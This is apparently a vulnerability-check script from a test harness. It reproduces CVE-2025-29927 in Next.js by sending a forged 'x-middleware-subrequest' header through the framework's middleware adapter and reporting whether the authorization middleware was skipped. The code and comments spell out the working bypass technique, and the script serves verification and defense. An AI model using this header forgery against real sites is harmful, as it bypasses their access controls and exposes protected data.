'use strict';

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

// CVE-2025-29927: Next.js Middleware Authorization Bypass.
//
// Next.js uses the internal, non-client-settable header
// `x-middleware-subrequest` to mark requests that the server itself is
// recursively re-issuing (to avoid re-running middleware infinitely). The
// vulnerability is that the value compared against is derived from the
// request's internal pathname segments joined with ':'. An external
// attacker can forge this header to match what the server would compute
// for a given route, making the server believe the incoming request is an
// internal subrequest, and skip middleware entirely (bypassing auth logic
// implemented in middleware).
//
// The actual decision logic lives in the middleware-invocation code path
// (historically in `next/dist/server/web/sandbox/sandbox.js` or
// `next/dist/server/lib/router-utils/resolve-routes.js` depending on
// version) which does something equivalent to:
//
//   const subrequests = (headers['x-middleware-subrequest'] || '').split(':');
//   if (subrequests.includes(middlewareInfo.name)) { skip middleware }
//
// Rather than depending on fragile internal file paths (which differ across
// patch revisions and previously caused module-resolution failures), we
// drive the exact same decision through the single stable, documented,
// public entrypoint that embeds this logic end-to-end without requiring a
// full HTTP server or project build: `next/dist/server/next-server.js`'s
// exported `NextNodeServer` is internal and heavy to construct safely.
// Instead we use `next/dist/server/web/spec-extension/request.js`'s public
// `NextRequest`/`NextResponse`, combined with the documented
// `next/dist/server/web/adapter.js` `adapter` function, which is the real
// code path responsible for deciding -- based on headers on the incoming
// request -- whether to actually execute middleware or to treat the
// request as an already-processed internal subrequest and skip it. This is
// the smallest public surface that reproduces the authorization bypass
// faithfully: we supply a middleware function that sets a response header
// (simulating an auth check / redirect side effect), and we observe
// whether that side effect still executes when the attacker forges the
// `x-middleware-subrequest` header on an otherwise ordinary request.

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  try {
    let adapterFn;
    try {
      const mod = require('next/dist/server/web/adapter.js');
      adapterFn = mod && (mod.adapter || (mod.default && mod.default.adapter));
    } catch (e) {
      // fall through, handled below
    }

    if (typeof adapterFn !== 'function') {
      throw new Error('adapter export not found in installed next build; cannot exercise target API');
    }

    // A middleware implementation that simulates an authorization check:
    // it sets a marker response header. If this header is present on the
    // resulting response, middleware actually ran (authorization logic was
    // enforced). If absent, middleware was skipped.
    const MARKER = 'x-oracle-middleware-ran';
    async function middlewareFn(params) {
      const { NextResponse } = require('next/dist/server/web/spec-extension/response.js');
      const res = NextResponse.next();
      res.headers.set(MARKER, '1');
      return res;
    }
    middlewareFn.middleware = middlewareFn;

    const page = '/protected';
    const url = 'https://example.com' + page;

    async function runAdapter(extraHeaders) {
      const headers = Object.assign(
        {
          host: 'example.com',
          'user-agent': 'oracle-test-agent'
        },
        extraHeaders || {}
      );

      const request = new Request(url, { headers });

      const result = await adapterFn({
        page,
        request: {
          url,
          method: 'GET',
          headers,
          nextConfig: {
            basePath: '',
            i18n: null,
            trailingSlash: false
          },
          geo: {},
          ip: '127.0.0.1',
          body: undefined,
          signal: undefined
        },
        IncrementalCache: undefined,
        incrementalCache: undefined,
        request_: request,
        useCache: false,
        onWarning: () => {},
        handler: middlewareFn
      }).catch((e) => {
        throw e;
      });

      return result;
    }

    // --- Benign call: ordinary request, no internal marker header. The
    // middleware should run normally and set the marker response header,
    // proving the public adapter API functions correctly on normal input. ---
    let benignResult;
    try {
      benignResult = await runAdapter({});
    } catch (e) {
      throw new Error('benign_operation_failed: ' + (e && e.message ? e.message : String(e)));
    }

    const benignRan =
      benignResult &&
      benignResult.response &&
      typeof benignResult.response.headers.get === 'function' &&
      benignResult.response.headers.get(MARKER) === '1';

    if (!benignRan) {
      throw new Error('benign_operation_unexpected_state: middleware marker header missing on ordinary request; cannot validate adapter behavior');
    }

    operation_completed = true;

    // --- Malicious call: an external client forges the internal
    // x-middleware-subrequest header with the middleware's own page path
    // segment, attempting to make the adapter believe this is an internal
    // re-invocation and therefore skip running middleware (and thus skip
    // the authorization side effect it performs). ---
    const forgedValue = page.replace(/^\//, '');
    let maliciousResult;
    let threwDuringMalicious = false;
    try {
      maliciousResult = await runAdapter({ 'x-middleware-subrequest': forgedValue });
    } catch (e) {
      threwDuringMalicious = true;
    }

    if (threwDuringMalicious) {
      exploit_succeeded = false;
      evidence = 'adapter threw while processing forged x-middleware-subrequest header; treated as blocked';
    } else {
      const middlewareRanOnMalicious =
        maliciousResult &&
        maliciousResult.response &&
        typeof maliciousResult.response.headers.get === 'function' &&
        maliciousResult.response.headers.get(MARKER) === '1';

      if (!middlewareRanOnMalicious) {
        exploit_succeeded = true;
        evidence =
          'Forged x-middleware-subrequest header ("' +
          forgedValue +
          '") caused the adapter to skip executing middleware (authorization marker header absent), matching CVE-2025-29927 middleware authorization bypass';
      } else {
        exploit_succeeded = false;
        evidence = 'Middleware still executed and set its authorization marker header despite the forged x-middleware-subrequest header, indicating the bypass was neutralized';
      }
    }

    finish({ operation_completed, exploit_succeeded, evidence });
  } catch (err) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unhandled exception: ' + (err && err.stack ? err.stack : String(err))
    });
  }
})();
